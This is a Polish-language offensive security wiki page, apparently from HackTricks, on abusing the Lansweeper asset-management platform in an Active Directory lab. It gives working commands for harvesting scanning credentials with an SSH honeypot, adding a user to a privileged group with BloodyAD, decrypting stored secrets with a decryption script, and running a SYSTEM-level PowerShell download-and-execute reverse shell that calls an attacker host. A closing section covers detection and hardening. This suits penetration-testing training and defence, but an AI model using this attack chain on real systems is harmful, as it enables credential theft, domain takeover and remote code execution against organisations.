# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper to platforma do odkrywania i inwentaryzacji zasobów IT często wdrażana na Windows i zintegrowana z Active Directory. Poświadczenia skonfigurowane w Lansweeper są używane przez jego silniki skanujące do uwierzytelniania się do zasobów przez protokoły takie jak SSH, SMB/WMI i WinRM. Błędne konfiguracje często pozwalają na:

- Przechwytywanie poświadczeń przez przekierowanie Scanning Target na host kontrolowany przez atakującego (honeypot)
- Nadużycie AD ACLs eksponowanych przez Lansweeper-related groups w celu uzyskania dostępu zdalnego
- Deszyfrację sekretów skonfigurowanych w Lansweeper bezpośrednio na hoście (connection strings i przechowywane poświadczenia skanowania)
- Wykonanie kodu na zarządzanych endpointach przez funkcję Deployment (często uruchamianą jako SYSTEM)

Ta strona podsumowuje praktyczne ścieżki działania atakującego i polecenia do nadużycia tych zachowań podczas engagementów.

## 1) Zbieranie poświadczeń skanowania przez honeypot (przykład SSH)

Idea: utwórz Scanning Target wskazujący na Twój host i przypisz do niego istniejące Scanning Credentials. Gdy skan się uruchomi, Lansweeper spróbuje uwierzytelnić się przy użyciu tych poświadczeń, a Twój honeypot je przechwyci.

Przegląd kroków (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Kliknij “Scan now” na targetcie
- Uruchom SSH honeypot i pobierz próby użytych username/password

Przykład z sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Zweryfikuj captured creds względem usług DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- Działa podobnie dla innych protokołów, gdy możesz zmusić skaner do połączenia z twoim listenerem (SMB/WinRM honeypots, etc.). SSH jest często najprostszy.
- Wiele skanerów identyfikuje się przez charakterystyczne bannery klienta (e.g., RebexSSH) i spróbuje wykonać nieszkodliwe polecenia (uname, whoami, etc.).

## 2) AD ACL abuse: uzyskaj zdalny dostęp, dodając siebie do grupy app-admin

Use BloodHound to enumerate effective rights from the compromised account. A common finding is a scanner- or app-specific group (e.g., “Lansweeper Discovery”) holding GenericAll over a privileged group (e.g., “Lansweeper Admins”). If the privileged group is also member of “Remote Management Users”, WinRM becomes available once we add ourselves.

Przykłady zbierania:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll na grupie przy użyciu BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Następnie uzyskaj interaktywną powłokę:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Wskazówka: operacje Kerberos są zależne od czasu. Jeżeli natrafisz na KRB_AP_ERR_SKEW, najpierw zsynchronizuj czas z DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Odszyfruj sekrety skonfigurowane przez Lansweeper na hoście

Na serwerze Lansweeper witryna ASP.NET zazwyczaj przechowuje zaszyfrowany connection string oraz klucz symetryczny używany przez aplikację. Mając odpowiedni dostęp lokalny, możesz odszyfrować ciąg połączenia do bazy danych i następnie wyodrębnić przechowywane poświadczenia skanowania.

Typowe lokalizacje:
- Plik web.config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Klucz aplikacji: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Użyj SharpLansweeperDecrypt, aby zautomatyzować odszyfrowywanie i zrzut przechowywanych poświadczeń:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
W oczekiwanym wyniku znajdują się szczegóły połączenia z DB oraz jawne dane uwierzytelniające skanowania, takie jak konta Windows i Linux używane w całym środowisku. Często mają one podwyższone lokalne uprawnienia na hostach domenowych:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Wykorzystaj odzyskane poświadczenia skanowania Windows do uzyskania dostępu uprzywilejowanego:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Jako członek grupy “Lansweeper Admins”, interfejs webowy udostępnia zakładki Deployment i Configuration. W sekcji Deployment → Deployment packages możesz tworzyć pakiety, które uruchamiają dowolne polecenia na wybranych zasobach. Wykonanie odbywa się przez usługę Lansweeper z wysokimi uprawnieniami, co daje wykonanie kodu jako NT AUTHORITY\SYSTEM na wybranym hoście.

Główne kroki:
- Utwórz nowy pakiet Deployment, który uruchamia jednowierszowy skrypt PowerShell lub cmd (reverse shell, add-user, itp.).
- Wskaż docelowy zasób (np. DC/host, na którym działa Lansweeper) i kliknij Deploy/Run now.
- Przechwyć swój shell jako SYSTEM.

Przykładowe payloady (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Akcje wdrożeniowe są głośne i zostawiają logi w Lansweeper i dziennikach zdarzeń Windows. Używaj rozważnie.

## Wykrywanie i wzmacnianie zabezpieczeń

- Ogranicz lub usuń anonimowe enumeracje SMB. Monitoruj RID cycling i anomalny dostęp do udziałów Lansweeper.
- Kontrole ruchu wychodzącego: zablokuj lub ściśle ogranicz outbound SSH/SMB/WinRM z hostów skanujących. Alarmuj na niestandardowe porty (np. 2022) i nietypowe banery klientów, takie jak Rebex.
- Chroń `Website\\web.config` i `Key\\Encryption.txt`. Wyodrębnij sekrety do vault i rotuj je po ujawnieniu. Rozważ konta serwisowe z minimalnymi uprawnieniami oraz gMSA tam, gdzie to możliwe.
- Monitorowanie AD: alarmuj o zmianach w grupach powiązanych z Lansweeper (np. “Lansweeper Admins”, “Remote Management Users”) oraz o zmianach ACL przyznających GenericAll/Write dla grup uprzywilejowanych.
- Audytuj tworzenie/zmiany/wykonywanie pakietów Deployment; alarmuj na pakiety uruchamiające cmd.exe/powershell.exe lub niespodziewane połączenia wychodzące.

## Powiązane tematy
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## Referencje
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
